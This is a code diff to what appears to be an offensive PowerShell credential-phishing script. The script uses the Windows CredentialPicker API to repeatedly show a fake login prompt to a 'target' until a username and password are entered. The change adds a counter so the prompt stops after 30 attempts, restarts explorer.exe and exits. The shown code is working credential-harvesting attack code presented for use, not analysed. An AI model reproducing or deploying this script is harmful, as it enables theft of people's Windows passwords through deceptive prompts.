@@ -38,6 +38,7 @@ $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.
 
 
 ## For our While loop
+[int]$counter = 0
 $status = $true
 
 ## There are 6 different authentication protocols supported.
@@ -60,13 +61,23 @@ function Await($WinRtTask, $ResultType) {
 
 function Credentials(){
     while ($status){
+
+        ## Defining the Limmit number of times to ask target for creds before aborting.
+        # Change the next value to increase/decrease the number of times the msgbox prompts.
+        If($counter -eq 30){
+          Start-Process -FilePath $env:windir\explorer.exe
+          $status = $false
+          exit
+        }
         
         ## Where the magic happens
         $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
         if (-not($creds.CredentialPassword) -or $creds.CredentialPassword -eq $null){
+            $counter++
             Credentials
         }
         if (-not($creds.CredentialUserName)){
+            $counter++
             Credentials
         }
         else {
@@ -88,6 +99,7 @@ function Credentials(){
                     exit
                     }
                 else {
+                    $counter++
                     Credentials
                     }                
                 }
